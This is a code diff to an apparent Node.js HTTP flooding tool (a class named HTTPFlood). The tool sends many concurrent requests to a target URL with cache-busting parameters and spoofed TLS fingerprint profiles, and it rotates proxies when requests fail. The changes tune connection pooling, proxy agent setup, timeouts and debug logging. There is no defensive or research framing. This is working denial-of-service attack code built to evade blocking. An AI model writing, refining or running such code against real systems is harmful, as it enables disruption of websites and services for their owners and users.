@@ -199,7 +199,8 @@ function createTLSAgent(profile, proxyUrl = null) {
         ecdhCurve: profile.tls.ecdhCurve,
         honorCipherOrder: true,
         sessionTimeout: 300,
-        ALPNProtocols: ['h2', 'http/1.1']
+        keepAlive: true,
+        maxSockets: 100
     };
     
     if (profile.tls.sigalgs) {
@@ -207,11 +208,9 @@ function createTLSAgent(profile, proxyUrl = null) {
     }
     
     if (proxyUrl) {
-        if (proxyUrl.startsWith('https')) {
-            return new HttpsProxyAgent(proxyUrl, tlsOptions);
-        } else {
-            return new HttpProxyAgent(proxyUrl);
-        }
+        return proxyUrl.startsWith('https') 
+            ? new HttpsProxyAgent(proxyUrl, tlsOptions)
+            : new HttpProxyAgent(proxyUrl);
     }
     
     return new https.Agent(tlsOptions);
@@ -467,33 +466,24 @@ class HTTPFlood {
                 
                 targetUrl = addCacheBuster(targetUrl);
                 
-                const proxy = config.proxies.length > 0 ? config.proxies[currentProxyIndex] : null;
-                
-                let httpsAgent, httpAgent;
-                if (proxy) {
-                    httpsAgent = createTLSAgent(profile, proxy);
-                    httpAgent = proxy.startsWith('https') ? new HttpsProxyAgent(proxy) : new HttpProxyAgent(proxy);
-                } else {
-                    httpsAgent = createTLSAgent(profile, null);
-                    httpAgent = new http.Agent({ keepAlive: true });
-                }
-                
                 const axiosConfig = {
                     method: this.method.toLowerCase(),
                     url: targetUrl,
                     headers,
-                    timeout: 1500,
-                    maxRedirects: getRandomElement([0, 1, 2]),
+                    timeout: 3000,
+                    maxRedirects: 5,
                     validateStatus: () => true,
-                    maxContentLength: 50000,
-                    maxBodyLength: 50000,
-                    httpAgent: httpAgent,
-                    httpsAgent: httpsAgent,
                     decompress: true
                 };
                 
-                if (Math.random() > 0.9) {
-                    await addRealisticDelay();
+                if (config.proxies.length > 0) {
+                    const proxy = config.proxies[currentProxyIndex];
+                    axiosConfig.proxy = false;
+                    axiosConfig.httpsAgent = createTLSAgent(profile, proxy);
+                    axiosConfig.httpAgent = createTLSAgent(profile, proxy);
+                } else {
+                    axiosConfig.httpsAgent = createTLSAgent(profile, null);
+                    axiosConfig.httpAgent = new http.Agent({ keepAlive: true, maxSockets: 100 });
                 }
                 
                 if (this.method === 'POST') {
@@ -507,6 +497,10 @@ class HTTPFlood {
                 
                 updateStats(true, response.status, bytesSent, bytesReceived);
                 
+                if (config.debug && localCount % 100 === 0) {
+                    console.log(`[DEBUG] Thread ${threadId}: ${response.status} - ${bytesSent}b sent, ${bytesReceived}b received`);
+                }
+                
                 if (config.proxies.length > 0 && localCount % 10 === 0) {
                     const proxyIP = config.proxies[currentProxyIndex].replace(/^https?:\/\//, '').split(':')[0];
                     config.workingProxies.add(proxyIP);
@@ -519,10 +513,16 @@ class HTTPFlood {
                 updateStats(false);
                 consecutiveFails++;
                 
+                if (config.debug && consecutiveFails <= 3) {
+                    console.log(`[DEBUG] Thread ${threadId} error: ${error.message}`);
+                }
+                
                 if (consecutiveFails >= 2 && config.proxies.length > 0) {
                     currentProxyIndex = (currentProxyIndex + 1) % config.proxies.length;
                     consecutiveFails = 0;
                 }
+                
+                await new Promise(resolve => setTimeout(resolve, 10));
             }
         }
     }
